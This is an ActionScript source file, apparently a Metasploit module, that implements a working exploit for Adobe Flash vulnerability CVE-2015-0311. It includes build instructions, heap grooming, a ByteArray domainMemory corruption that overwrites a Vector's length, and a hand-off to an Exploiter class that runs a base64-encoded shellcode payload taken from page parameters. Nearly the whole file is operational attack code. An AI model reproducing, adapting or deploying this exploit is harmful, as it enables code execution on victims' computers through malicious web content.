// Build how to:
// 1. Download the AIRSDK, and use its compiler.
// 3. Download the Flex SDK (4.6)
// 4. Copy the Flex SDK libs (<FLEX_SDK>/framework/libs) to the AIRSDK folder (<AIR_SDK>/framework/libs)
//      (all of them, also, subfolders, specially mx, necessary for the Base64Decoder)
// 5. Build with: mxmlc -o msf.swf Exploit.as

// Original exploit by @hdarwin89 // http://blog.hacklab.kr/flash-cve-2015-0311-%EB%B6%84%EC%84%9D/

package
{
    import flash.display.Sprite
    import flash.display.LoaderInfo
    import flash.system.ApplicationDomain
    import flash.utils.ByteArray
    import avm2.intrinsics.memory.*
    import flash.external.ExternalInterface
    import mx.utils.Base64Decoder

    public class Exploit extends Sprite 
    {
        private var data:uint = 0xdeaddead
        private var uv:Vector.<uint> = new Vector.<uint>
        private var ba:ByteArray = new ByteArray()
        private var exploiter:Exploiter
        private var b64:Base64Decoder = new Base64Decoder()
        private var payload:ByteArray
        private var platform:String
        private var os:String

        public function Exploit() 
        {
            platform = LoaderInfo(this.root.loaderInfo).parameters.pl
            os = LoaderInfo(this.root.loaderInfo).parameters.os
            var b64_payload:String = LoaderInfo(this.root.loaderInfo).parameters.sh
            var pattern:RegExp = / /g;
            b64_payload = b64_payload.replace(pattern, "+")
            b64.decode(b64_payload)
            payload = b64.toByteArray()

            // defrag           
            for (var i:uint = 0; i < 10000; i++) new Vector.<uint>(0x3e0)

            for (i = 0; i < 1000; i++) ba.writeUnsignedInt(data++)
            ba.compress()
            ApplicationDomain.currentDomain.domainMemory = ba
            ba.position = 0x200
            for (i = 0; i < ba.length - ba.position; i++) ba.writeByte(00)
            try {
                ba.uncompress()
            } catch (e:Error) { }
            uv = new Vector.<uint>(0x3e0)
            uv[0] = 0 

            var test:uint = li32(0)
            if (test == 0x3e0) {
                si32(0xffffffff, 0) // corrupted
            } else {
                Logger.log('[*] Exploit - corruption fail: ' + test.toString(16))
                return // something failed
            }
            
            exploiter = new Exploiter(this, platform, os, payload, uv)
        }

    }
}